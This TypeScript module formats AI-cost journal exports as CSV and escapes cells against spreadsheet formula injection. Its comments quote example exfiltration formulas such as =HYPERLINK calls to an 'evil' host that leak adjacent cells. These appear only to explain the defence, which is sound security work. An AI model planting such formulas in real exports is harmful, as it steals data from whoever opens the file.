/**
 * WHAT THIS FILE DOES: Turns a journal export (AI cost rolled up by GL code)
 * into downloadable CSV text — both the "summary" (one row per account) and
 * the "journal" (balanced double-entry) formats. Pure string-building only,
 * no database, no request handling.
 *
 * WHY IT EXISTS: it sits apart from route.ts so the CSV logic can be
 * unit-tested on its own. The route handler imports the server action
 * getJournalExport, which opens a Prisma/DB connection; importing the route
 * from a test would drag all of that in. Keeping the formatting here (it only
 * needs the data shape, not the data source) is what lets the formula-injection
 * tests run in a plain Node test environment.
 *
 * CONNECTS TO: route.ts (GET handler imports toSummaryCsv / toJournalCsv),
 * journal-utils.ts (buildJournalLines), journal-export.ts (the JournalExport
 * data shape).
 */

import { buildJournalLines } from '@/features/cost-management/journal-utils'
// Type-only import: erased at compile time, so this module never loads the
// server action (and its DB connection) at runtime.
import type {
  JournalExport,
  JournalAuditDetail,
} from '@/app/actions/journal-export'

export type JournalData = JournalExport

/**
 * Escape a value for a CSV cell so the file is safe to open in a spreadsheet.
 *
 * Two layers, applied in this order:
 *
 *  1. Formula-injection defense (CWE-1236). Excel / Google Sheets / LibreOffice
 *     treat any cell that STARTS with the full OWASP trigger set — `=`, `+`,
 *     `-`, `@`, TAB, CR, or LF — as a formula and run it the moment the file is
 *     opened. GL names and codes in this export are typed by org users, so a
 *     value like `=HYPERLINK("http://evil/?leak="&A1,"click")` would execute on
 *     the accountant's machine (exfiltrate adjacent cells, pop a DDE prompt, or
 *     silently mis-total the books). We neutralize it the OWASP-standard way:
 *     prefix a single quote, which forces the spreadsheet to treat the whole
 *     cell as literal text. This runs BEFORE the quoting step so the prefix
 *     ends up inside any wrapping quotes.
 *
 *  2. RFC-4180 field quoting. If the (possibly prefixed) value contains a
 *     comma, double-quote, or ANY line break — LF *or* bare CR — wrap it in
 *     double-quotes and double any embedded quote. Bare CR matters: a Mac-
 *     dialect / Excel Text-Import parser treats a lone CR as a row terminator,
 *     so an INTERIOR CR like `Cost\r=1+1` would otherwise split into a new row
 *     starting with `=1+1` — a formula back at a cell boundary that the
 *     leading-char guard above can't see (it only inspects the original first
 *     char). Quoting keeps the whole value as one inert text cell.
 */
export function csvCell(value: string | number | null): string {
  let s = value === null ? '' : String(value)
  // Layer 1: defang spreadsheet formula triggers (full OWASP lead-char set).
  if (/^[=+\-@\t\r\n]/.test(s)) {
    s = `'${s}`
  }
  // Layer 2: RFC-4180 quoting — quote on comma, quote, LF, or bare CR.
  if (/[",\n\r]/.test(s)) {
    return `"${s.replace(/"/g, '""')}"`
  }
  return s
}

/** Cost-by-GL-code summary CSV. One row per account + a total row. */
export function toSummaryCsv(data: JournalData): string {
  const header = [
    'GL Code',
    'GL Name',
    'Account Type',
    'Amount (USD)',
    'Event Count',
    'Period Start',
    'Period End',
    'Memo',
  ]
  const periodStart = data.periodStart.slice(0, 10)
  const periodEnd = data.periodEnd.slice(0, 10)

  const lines = [header.map(csvCell).join(',')]
  for (const row of data.rows) {
    lines.push(
      [
        csvCell(row.glCode ?? 'UNMAPPED'),
        csvCell(row.glName),
        csvCell(row.accountingType ?? ''),
        csvCell(row.amount.toFixed(2)),
        csvCell(row.eventCount),
        csvCell(periodStart),
        csvCell(periodEnd),
        csvCell(
          `AI usage ${periodStart} to ${periodEnd}: ${row.eventCount} events`,
        ),
      ].join(','),
    )
  }
  // Trailing total row for quick eyeball reconciliation.
  lines.push(
    [
      csvCell('TOTAL'),
      csvCell('All AI cost for period'),
      csvCell(''),
      csvCell(data.totalAmount.toFixed(2)),
      csvCell(data.rows.reduce((s, r) => s + r.eventCount, 0)),
      csvCell(periodStart),
      csvCell(periodEnd),
      csvCell(
        data.hasUnmapped
          ? `WARNING: ${data.unmappedAmount.toFixed(2)} is unmapped. Assign GL codes to refine`
          : 'All cost mapped to GL codes',
      ),
    ].join(','),
  )

  return lines.join('\n')
}

/**
 * Balanced double-entry journal CSV. Debit lines (one per GL code) + a
 * single credit line to the offset account. Columns are generic
 * (Date / Account / GL Code / Debit / Credit / Memo) — an accountant maps
 * these to their ledger's import template.
 */
export function toJournalCsv(data: JournalData): string {
  const header = ['Date', 'Account', 'GL Code', 'Debit', 'Credit', 'Memo']
  const periodEnd = data.periodEnd.slice(0, 10)
  const lines = [header.map(csvCell).join(',')]

  for (const line of buildJournalLines(data)) {
    lines.push(
      [
        csvCell(periodEnd),
        csvCell(line.account),
        csvCell(line.glCode ?? 'UNMAPPED'),
        csvCell(line.debit > 0 ? line.debit.toFixed(2) : ''),
        csvCell(line.credit > 0 ? line.credit.toFixed(2) : ''),
        csvCell(line.memo),
      ].join(','),
    )
  }

  return lines.join('\n')
}

/**
 * Drillable audit-trail CSV. Flattens the full audit detail to the
 * auditable grain: ONE row per (GL code, signal, usage event). This is the
 * file a first-year accountant exports to prove any journal line back to its
 * source — every event that built the number, which signal produced it, and
 * how that signal was classified.
 *
 * HONESTY: "source" is the INTERNAL chain (GL ← signal ← usage events), not a
 * provider invoice; the app holds no provider invoices. The
 * caller surfaces detail.sourceLabel separately; this builder just emits the
 * internal grain truthfully (the "Classification Source" column says how the
 * signal got its category, e.g. "default / not manually overridden").
 *
 * SECURITY: every cell — including the org-controlled strings glName,
 * signalName, and agentId — routes through csvCell() so a malicious GL/signal
 * name like `=HYPERLINK("http://evil","x")` exports as inert text (CWE-1236,
 * the formula-injection defense above).
 */
export function toDetailCsv(detail: JournalAuditDetail): string {
  const header = [
    'GL Code',
    'GL Name',
    'Account Type', // = P&L line (COGS / OpEx)
    'Signal',
    'Agent',
    'Cost Category',
    'Classification Source',
    'Event ID',
    'Usage Date',
    'Environment',
    'Quantity',
    'Amount (USD)',
  ]
  const lines = [header.map(csvCell).join(',')]

  for (const gl of detail.glLines) {
    for (const signal of gl.signals) {
      // Honest provenance string: the manual-override source if there is one,
      // otherwise we say plainly the signal was never manually overridden.
      const classificationSource = signal.classification
        ? `${signal.classification.source} @ ${signal.classification.classifiedAt.slice(0, 10)}`
        : 'default / not manually overridden'

      for (const ev of signal.events) {
        lines.push(
          [
            csvCell(gl.glCode ?? 'UNMAPPED'),
            csvCell(gl.glName),
            csvCell(gl.accountingType ?? ''),
            csvCell(signal.signalName),
            csvCell(signal.agentId),
            csvCell(signal.costCategory),
            csvCell(classificationSource),
            csvCell(ev.eventId),
            csvCell(ev.usageDate.slice(0, 10)),
            csvCell(ev.environment ?? ''),
            csvCell(ev.quantity),
            // Per-event amounts stay at the schema's full Decimal(18,6) precision so an
            // auditor can sum these rows back to the GL line (per-token LLM events are
            // sub-cent; rounding each to cents here drops them to 0.00 and breaks reconcile).
            // The single GL-level rounding to cents happens in toSummaryCsv/toJournalCsv
            // (rule R4 in packages/db/CANON.md: round exactly once, at the presentation leaf).
            csvCell(ev.usageCost.toFixed(6)),
          ].join(','),
        )
      }
    }
  }

  return lines.join('\n')
}
